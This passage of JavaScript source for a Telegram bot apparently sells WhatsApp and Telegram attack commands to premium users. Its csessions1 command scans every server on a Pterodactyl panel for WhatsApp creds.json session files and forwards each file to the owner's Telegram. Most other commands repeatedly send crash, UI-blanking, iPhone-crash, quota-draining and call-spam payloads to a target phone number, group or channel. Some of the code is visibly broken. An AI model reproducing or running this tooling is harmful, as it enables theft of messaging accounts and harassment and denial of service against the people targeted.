    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

bot.command("csessions1", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions1 <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions1 <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

bot.command("tourl", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 Example : /tourl <reply foto/video>");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

const ewek = {};
const wasu = {};

async function aiPerplexity(query) {
  try {
    const url = "http://api.ikyyxd.my.id/ai/perplexity?query=" + encodeURIComponent(query);
    const res = await axios.get(url, { timeout: 30000 });
    return res.data.result || JSON.stringify(res.data);
  } catch (err) {
    return "Terjadi error: " + err.message;
  }
}

bot.command("ai", checkPremium, async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();

  // ambil query (lebih clean & aman)
  const query = ctx.message.text.replace(/^\/ai\s*/i, "").trim();

  if (!query) {
    return ctx.reply("🪧 Contoh: /ai siapa presiden indonesia");
  }

  // cooldown
  if (ewek[userId] && now - ewek[userId] < 5000) {
    return ctx.reply("⏳ Tunggu 5 detik sebelum pakai lagi");
  }

  // anti double request
  if (wasu[userId]) {
    return ctx.reply("⚠️ Tunggu, request sebelumnya masih diproses");
  }

  ewek[userId] = now;
  wasu[userId] = true;

  const wait = await ctx.reply("🤖 AI lagi mikir...");

  try {
    let hasil = await aiPerplexity(query);

    if (!hasil) {
      hasil = "❌ AI tidak merespon.";
    }

    if (hasil.length > 4000) {
      hasil = hasil.slice(0, 4000) + "...";
    }

    await ctx.reply(hasil);
  } catch (err) {
    console.log("AI ERROR:", err);
    await ctx.reply("❌ Terjadi error saat memproses AI");
  } finally {
    wasu[userId] = false;
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("gethtml", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.text || !reply.text.startsWith("http")) {
    return ctx.reply("🪧 Example : /gethtml <reply pesan>");
  }
  const url = reply.text.trim();

  try {
    await ctx.reply("⏳ Mengambil source code dari website...");
    const response = await axios.get(url);
    const htmlContent = response.data;
    await ctx.replyWithDocument(
      { source: Buffer.from(htmlContent, "utf-8"), filename: "source-code.html" },
      { caption: `📦 source code web dari ${url}` }
    );
  } catch (err) {
    console.error("⚠️ Gagal ambil kode:", err.message);
    ctx.reply("⚠️ Gagal mengambil source code dari website tersebut.");
  }
});

bot.command("cekid", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  const user = reply ? reply.from : ctx.from;
  const id = `\`${user.id}\``;
  const username = user.username ? `@${user.username}` : '(tidak ada username)';

  return ctx.reply(
    `ID User : ${id}\nUsername : ${username}`,
    { parse_mode: 'MarkdownV2' }
  );
});

bot.command("status", checkPremium, async (ctx) => {
  const pid = process.pid;
  const uptimeSec = Math.floor(process.uptime());
  const uptimeH = Math.floor(uptimeSec / 3600);
  const uptimeM = Math.floor((uptimeSec % 3600) / 60);
  const uptimeS = uptimeSec % 60;
  const memory = (process.memoryUsage().rss / 1024 / 1024).toFixed(2);
  const cpuLoad = os.loadavg()[0].toFixed(2);
  const platform = `${os.type()} ${os.release()}`;
  const nodeVer = process.version;
  const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
  const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
  const cpuModel = os.cpus()[0].model;
  let totalUser = 0;
  try {
    const db = loadDatabase();
    if (db && db.users) totalUser = Object.keys(db.users).length;
  } catch {}

  await ctx.reply(`<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ PID: ${pid}
 ▢ Uptime: ${uptimeH}h ${uptimeM}m ${uptimeS}s
 ▢ RAM: ${memory} MB/${totalMem} GB
 ▢ CPU: ${cpuLoad}%
 ▢ CPU Model: ${cpuModel}
 ▢ Platform: ${platform}
 ▢ NodeJS: ${nodeVer}
 ▢ Total Users: ${totalUser}`,
    { parse_mode: "HTML" }
  );
});

bot.command("restart", checkPremium, async (ctx) => {
  await ctx.reply("🔄 Merestart bot...");
  process.exit(1);
});

bot.command("telecrash", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const target = args[1];
 
  if (!target) return ctx.reply("🪧 Example : /telecrash 123×××");

  await ctx.reply(`Succes Send Bug To ${target}`);
  for (let i = 0; i < 25; i++) {
    await crashtele1(target);
    await sleep(5000);
  }
});

bot.command("teleblank", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const target = args[1];
 
  if (!target) return ctx.reply("🪧 Example : /teleblank 123×××");

  await ctx.reply(`Succes Send Bug To ${target}`);
  for (let i = 0; i < 25; i++) {
    await blanktele1(target);
    await sleep(5000);
  }
});

bot.command("blankui", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /blankui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Blank Ui
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await blanknotif1(sock, target);
    await sleep(5000);
    await blanknotif2(sock, target);
    await sleep(5000);
    await blanknotif3(sock, target);
    await sleep(5000);
    await blanknotif4(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Blank Ui
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /forclose 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Force Close Ui
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await KebabForclose, (sock, target);
    await sleep(5000);
    await force2(sock, target);
    await sleep(5000);
    await force3(sock, target);
    await sleep(5000);
    await force4(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Force Close Ui
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /xcrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Visible
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    visible1(sock, target);
    await sleep(5000);
    visible2(sock, target);
    await sleep(5000);
    visible3(sock, target);
    await sleep(5000);
    visible4(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Visible
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("crashmention", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /crashmention 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Mention
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    mention1(sock, target);
    await sleep(5000);
    mention2(target, mention);
    await sleep(5000);
    mention3(sock, target);
    await sleep(5000);
    mention4(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Mention
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("bulldozer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /bulldozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Quota Draining
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await quotadrain1(sock, target);
    await sleep(5000);
    await quotadrain2(sock, target);
    await sleep(5000);
    await quotadrain3(sock, target);
    await sleep(5000);
    await quotadrain4(target, mention);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Quota Draining
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("crashiphone", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /crashiphone 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Iphones Crash
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await applecrash1(target, mention);
    await sleep(5000);
    await applecrash2(target, mention);
    await sleep(5000);
    await applecrash3(sock, target);
    await sleep(5000);
    await applecrash4(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Iphones Crash
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("forceiphone", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /forceiphone 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Iphones Force
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await appleforce1(sock, target);
    await sleep(5000);
    await appleforce2(target, true);
    await sleep(5000);
    await appleforce3(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Iphones Force
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("blankgroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id
  const args = ctx.message.text.split(' ').slice(1)
  const groupLink = args[0]

  if (!groupLink) {
    return ctx.reply("🪧 Example : /blankgroup <link>")
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return ctx.reply("❌ Link tersebut tidak valid!")
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1]
  const waitMsg = await ctx.reply(`
  <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${groupId}
 ▢  Type: Group Blank
 ▢  Status: Process Bug`)

  try {
    const groupInfo = await sock.groupAcceptInvite(groupCode)
    const groupId = groupInfo.id

    for (let i = 0; i < 15; i++) {
      await blankgc1(sock, groupId)
      await sleep(5000);
      console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));

      await ctx.reply(`
      <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${groupId}
 ▢  Type: Group Blank
 ▢  Status: Success Bug
`)
    }

    await ctx.deleteMessage(waitMsg.message_id)
  } catch (err) {
    console.error("Error:", err)
    ctx.reply("❌ Gagal mengirim bug ke group.")
  }
})

bot.command("crashgroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id
  const args = ctx.message.text.split(' ').slice(1)
  const groupLink = args[0]

  if (!groupLink) {
    return ctx.reply("🪧 Example : /crashgroup <link>")
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return ctx.reply("❌ Link tersebut tidak valid!")
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1]
  const waitMsg = await ctx.reply(`
  <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${groupId}
 ▢  Type: Group Crash
 ▢  Status: Process Bug`)

  try {
    const groupInfo = await sock.groupAcceptInvite(groupCode)
    const groupId = groupInfo.id

    for (let i = 0; i < 15; i++) {
      await crashgc1(sock, groupId)
      await sleep(5000);
      console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));

      await ctx.reply(`
      <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${groupId}
 ▢  Type: Group Crash
 ▢  Status: Success Bug
`)
    }

    await ctx.deleteMessage(waitMsg.message_id)
  } catch (err) {
    console.error("Error:", err)
    ctx.reply("❌ Gagal mengirim bug ke group.")
  }
})

bot.command('crashchannel', checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text.split(' ')[1];

  if (!text) {
    return ctx.reply("🪧 Example : /crashchannel <ch id>");
  }

  const targetChannel = text.trim();
  ctx.reply(`<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${targetChannel}
 ▢  Type: Channel Crash
 ▢  Status: Process Bug`);

  try {
    for (let r = 0; r < 15; r++) {
      await crashch1(sock, targetChannel);
      await sleep(5000);
      await crashch2(sock, targetChannel);
      await sleep(5000);
      console.log(chalk.red(`Sending Bug By DeathleshXStrom 🍁`));
    }
    ctx.reply(`<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${targetChannel}
 ▢  Type: Channel Crash
 ▢  Status: Success Bug`);
  } catch (err) {
    console.error("Error:", err);
    ctx.reply("❌ Gagal mengirim bug ke channel.");
  }
});

bot.command("spamcall", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Example : /spamcall 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrlV2, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Call Spam
 ▢  Status: Process Bug`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await offercall1(sock, target);
    await sleep(5000);
    await offercall2(sock, target);
    await sleep(5000);
    console.log(chalk.red(`Sending Spam By DeathleshXStrom 🍁`));
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: Crash Call Spam
 ▢  Status: Success Bug`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
        { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 Example : /testfunction 62××× 10 (reply function)\n🪧 Example file : /testfunction 62××× 10 (reply file.js)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
